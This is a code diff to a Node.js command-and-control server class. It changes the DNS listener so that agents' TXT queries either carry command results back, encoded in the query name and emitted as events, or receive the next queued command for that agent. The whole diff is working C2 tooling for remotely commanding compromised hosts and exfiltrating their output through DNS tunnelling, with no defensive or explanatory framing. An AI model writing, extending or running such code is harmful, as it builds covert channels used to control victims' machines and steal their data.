@@ -2,7 +2,7 @@ const http = require('http');
 const url = require('url');
 const { WebSocketServer } = require('ws');
 const { EventEmitter } = require('events');
-const { DNSProtocol } = require('./dnsprotocol');
+const { DNSProtocol, extractQueryType, extractResultFromQuery } = require('./dnsprotocol');
 
 class C2Server extends EventEmitter {
   constructor(options = {}) {
@@ -42,17 +42,27 @@ class C2Server extends EventEmitter {
     this.dns = new DNSProtocol(this.dnsPort, 'server');
     this.dns.onQuery((parsed, agentId, rawMsg) => {
       if (!agentId) return;
+      if (parsed.qtype !== 16) return;
 
-      if (parsed.qtype === 16) {
-        const pending = this.getPendingCommands(agentId);
-        const answers = [];
-        if (pending.length > 0) {
-          const cmd = pending[0];
-          this.commandQueue.get(agentId).shift();
-          answers.push({ name: parsed.qname, type: 'TXT', data: cmd, ttl: 1 });
+      const qtype = extractQueryType(parsed.qname);
+
+      if (qtype === 'r') {
+        const resultData = extractResultFromQuery(parsed.qname);
+        if (resultData && resultData.id && resultData.result) {
+          this.emit('result', resultData.id, resultData.result);
         }
-        this.dns.sendResponse(rawMsg, parsed.rinfo, answers);
+        this.dns.sendResponse(rawMsg, parsed.rinfo, []);
+        return;
       }
+
+      const pending = this.getPendingCommands(agentId);
+      const answers = [];
+      if (pending.length > 0) {
+        const cmd = pending[0];
+        this.commandQueue.get(agentId).shift();
+        answers.push({ name: parsed.qname, type: 'TXT', data: cmd, ttl: 1 });
+      }
+      this.dns.sendResponse(rawMsg, parsed.rinfo, answers);
     });
     this.dns.start(callback);
   }
